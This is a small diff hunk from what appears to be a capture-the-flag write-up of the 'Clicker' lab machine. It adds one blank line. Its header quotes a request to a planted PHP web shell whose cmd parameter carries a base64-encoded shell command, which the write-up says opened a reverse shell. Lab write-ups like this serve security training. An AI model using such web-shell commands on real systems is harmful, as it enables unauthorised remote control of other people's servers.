@@ -389,6 +389,7 @@ http://clicker.htb/exports/top_players_0q3k1hvj.php?cmd=echo%20L2Jpbi9iYXNoIC1sI
 ```
 
 going to that url gave us a reverse shell
+
 ![Reverse shell](/assets/img/Clicker/Clicker_07.png)
 
 ## Lateral Movement
